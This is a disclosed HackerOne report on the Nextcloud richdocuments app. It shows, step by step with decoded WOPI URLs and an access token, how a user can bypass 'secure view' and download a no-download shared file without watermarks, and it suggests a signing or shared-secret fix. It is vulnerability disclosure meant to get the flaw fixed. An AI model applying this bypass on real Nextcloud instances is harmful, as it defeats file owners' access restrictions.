---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1724021'
original_report_id: '1724021'
title: Secure view trivial to bypass
weakness: Improper Access Control - Generic
team_handle: nextcloud
created_at: '2022-10-06T07:01:22.379Z'
disclosed_at: '2023-03-30T08:14:42.255Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
asset_identifier: nextcloud/richdocuments
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# Secure view trivial to bypass

## Metadata

- HackerOne Report ID: 1724021
- Weakness: Improper Access Control - Generic
- Program: nextcloud
- Disclosed At: 2023-03-30T08:14:42.255Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

While messing with https://hackerone.com/reports/1724016 I also noticed that it is even easier to bypass secure view.
Especially in NC 25 where you explicitly name the checkbox download a user will assume that downloading is thus not allowed or possible.

However if richdocuments is installed and properly configured. A user can still easily fetch those files.

All they have to do is open their browser and see the request that is like

```
ws://127.0.0.1:9980/cool/http%3A%2F%2F127.0.0.1%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F149_oc13vsnxh17n%3Faccess_token%3Dr7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ%26access_token_ttl%3D1665034074000/ws?WOPISrc=http%3A%2F%2F127.0.0.1%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F149_oc13vsnxh17n&compat=/ws
```

Now we extract out the internal part

```
http%3A%2F%2F127.0.0.1%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F149_oc13vsnxh17n%3Faccess_token%3Dr7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ%26access_token_ttl%3D1665034074000
```

We url decode it

```
http://127.0.0.1/index.php/apps/richdocuments/wopi/files/149_oc13vsnxh17n?access_token=r7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ&access_token_ttl=1665034074000
```

Now lets add a `/contents` to the url

```
http://127.0.0.1/index.php/apps/richdocuments/wopi/files/149_oc13vsnxh17n/conents?access_token=r7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ&access_token_ttl=1665034074000
```

And there you have it. Downloaded without watermarks.

## Impact

The checkbox as is misleads users into assuming that the file can't be downloaded.
However getting it is easy for anybody that tries.

A solution here would be to agree on some kind of public key cryptography or at the very least a shared secret between collabora and the Nextcloud instance. This could for example be passed via a header when doing calls. ensuring that only collabora can actually retrieve the file info, documents etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
